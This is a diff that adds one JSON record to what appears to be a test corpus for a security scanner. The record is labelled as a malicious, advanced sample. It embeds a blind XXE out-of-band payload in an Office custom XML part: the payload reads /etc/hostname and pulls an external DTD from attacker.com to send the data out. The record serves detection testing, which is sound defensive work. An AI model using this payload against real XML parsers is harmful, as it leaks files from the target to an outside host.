@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "gt::output::out-xxe-blind-oob.txt::binary-variations::4",
+  "base_sample_id": "gt::output::out-xxe-blind-oob.txt",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -158686051,
+  "content": "{\n  \"format\": \"office\",\n  \"customXml\": {\n    \"partName\": \"ppt/presentation.xml\",\n    \"content\": \"<root><field name=\\\"custom\\\"># Marfaak AI Security - XXE blind OOB\\n\\n**WARNING: This payload tests XXE blind OOB.**\\n\\n<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n<!DOCTYPE foo [\\n  <!ENTITY % file SYSTEM \\\"file:///etc/hostname\\\">\\n  <!ENTITY % dtd SYSTEM \\\"https://attacker.com/xxe.dtd\\\">\\n  %dtd;\\n]>\\n<data>Blind XXE exfiltration via OOB channel</data></field></root>\"\n  }\n}",
+  "content_hash": "369e0b02fd6abf1d9c9f81f234b805952209bd6f6e5250b410c8c9ef0b5f2888",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-custom-xml",
+  "difficulty": "advanced"
+}
